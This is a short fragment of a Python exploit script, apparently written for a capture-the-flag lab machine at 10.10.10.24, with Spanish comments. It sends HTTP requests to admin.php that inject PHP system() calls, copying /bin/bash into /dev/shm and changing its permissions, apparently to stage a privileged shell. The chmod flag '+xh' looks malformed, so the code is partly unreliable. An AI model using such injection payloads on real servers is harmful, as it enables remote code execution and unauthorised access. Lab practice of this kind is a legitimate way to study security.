...
# Variables globales
main_url = "http://10.10.10.24/admin.php"
...
def makeRequest():
	...
	# Urlencode %20=espacio en blanco, %26=&
	r = requests.get(main_url + "html=<?php%20system(\"cp%20/bin/bash%20/dev/shm/s4vitar\");%20?>", headers=headers)
	r = requests.get(main_url + "html=<?php%20system(\"chmod%20+xh%20/dev/shm/s4vitar\");%20?>", headers=headers)
